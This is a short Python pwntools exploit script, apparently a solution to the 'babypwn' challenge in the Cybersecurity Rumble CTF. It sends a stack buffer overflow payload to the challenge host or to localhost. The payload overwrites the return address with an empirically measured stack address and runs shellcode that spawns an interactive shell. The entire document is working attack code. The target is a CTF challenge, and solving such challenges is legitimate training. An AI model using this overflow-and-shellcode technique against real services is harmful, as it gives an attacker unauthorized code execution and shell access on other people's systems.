#!/usr/bin/env python3
from pwn import *

e = context.binary = ELF("./baby-pwn-for-download/docker/babypwn")

if args.REMOTE:
    io = remote("chal.cybersecurityrumble.de", 1990)
else:
    io = remote("localhost", 1990)

# Values found empirically using gdb and breaking at the return before
# check_user_input exits.
if args.REMOTE:
    base_stack_addr = 0x7ffffffde000
    sh_addr_offset = 132848+176
else:
    base_stack_addr = 0x7ffffffdd000
    sh_addr_offset = 137120

shellcode_stack_addr = base_stack_addr+sh_addr_offset

p = b"A"*112 + b"\x00"*8 # padding (zeros needed to cut off string)
p += pack(shellcode_stack_addr)
p += asm(shellcraft.sh())
io.sendline(p)
io.interactive()
